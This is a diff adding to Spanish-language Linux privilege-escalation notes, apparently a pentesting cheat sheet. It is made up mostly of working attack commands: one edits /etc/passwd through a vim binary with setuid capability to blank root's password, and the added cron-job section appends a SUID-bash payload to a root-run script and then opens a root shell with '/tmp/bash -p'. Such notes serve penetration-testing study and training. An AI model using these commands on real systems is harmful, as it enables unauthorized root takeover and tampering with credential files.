@@ -75,3 +75,13 @@ PATH ABUSE!!
 - Ejemplo: `/usr/bin/vim.basic /etc/passwd`
     - `echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd`
     - En este caso el binario vim.basic tiene la capacidad `cap_setuid` y `cap_setgid` por lo que podemos ejecutar el comando `id` como root..
+
+
+### Abusar de cronjobs
+- Primero  hay que encontrar directorios o archivos con acceso a escritura: `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`
+- `cat /etc/crontab` para ver los cronjobs del sistema.
+- `crontab -l -u root` para ver los cronjobs del usuario root.
+- Ahora imaginemonos que hay un script corriendo como root, del cual tenemos acceso de escritura.
+    - Podemos modificar el script para que ejecute un reverse shell haciendo un echo reverse shell + un shift right `>>` al script.
+    - `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /etc/cron.daily/script.sh`
+    - `/tmp/bash -p` => root shell
